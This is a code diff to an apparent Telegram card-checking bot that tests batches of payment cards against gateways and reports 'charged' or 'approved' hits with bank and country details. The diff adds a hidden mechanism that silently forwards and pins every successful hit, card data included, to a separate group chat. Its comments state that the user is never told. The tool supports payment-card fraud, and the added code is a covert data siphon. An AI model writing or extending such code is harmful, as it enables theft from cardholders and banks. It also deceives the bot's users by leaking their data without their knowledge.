@@ -355,7 +355,11 @@ def generate_result_file_content(session, result_type):
     return buf, filename, len(cards)
 
 
-async def send_gif_result(bot, user_obj, card, response, brand, bin_data, gateway, status_label, plan_name):
+# prefix -> group chat id that silently receives charged/approved hits (pinned there)
+GATE_GROUP_LOG = {}
+
+
+async def send_gif_result(bot, user_obj, card, response, brand, bin_data, gateway, status_label, plan_name, group_log_id=None, to_user=True):
     bin_scheme = html_escape(str(bin_data.get("scheme", brand or "N/A")))
     bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
     country_name = html_escape(str(bin_data.get("country", "N/A")))
@@ -384,7 +388,15 @@ async def send_gif_result(bot, user_obj, card, response, brand, bin_data, gatewa
         f"{EMOJI_DEV} 𝐃𝐞𝐯 ➠ {DEV_LINK}"
     )
 
-    await send_hit(bot, user_obj.id, caption, gif_url)
+    if to_user and user_obj is not None:
+        await send_hit(bot, user_obj.id, caption, gif_url)
+    if group_log_id:
+        sent = await send_hit(bot, group_log_id, caption, gif_url)
+        if sent is not None:
+            try:
+                await bot.pin_chat_message(chat_id=group_log_id, message_id=sent.message_id)
+            except Exception as e:
+                logging.warning(f"[BATCH] pin to group failed: {e}")
 
 
 async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, send_charged=True, send_approved=False, extra_stats_fn=None, max_workers=30):
@@ -538,6 +550,11 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
                 session["error_cards"].append(entry)
 
             should_update = (time.time() - session.get("last_update_time", 0)) >= 2.0 or session["checked"] == total
+
+        # silent group log (charged/approved always forwarded + pinned, user never told)
+        gid = GATE_GROUP_LOG.get(session.get("prefix", ""))
+        if gid and kind in ("charged", "approved"):
+            await send_gif_result(bot, user_obj, card, msg, brand, bin_data, gateway, kind.upper(), plan_name, group_log_id=gid, to_user=False)
 
         # send result for approved/charged hits (respect the DM toggles)
         if kind == "charged" and session.get("send_charged", True):
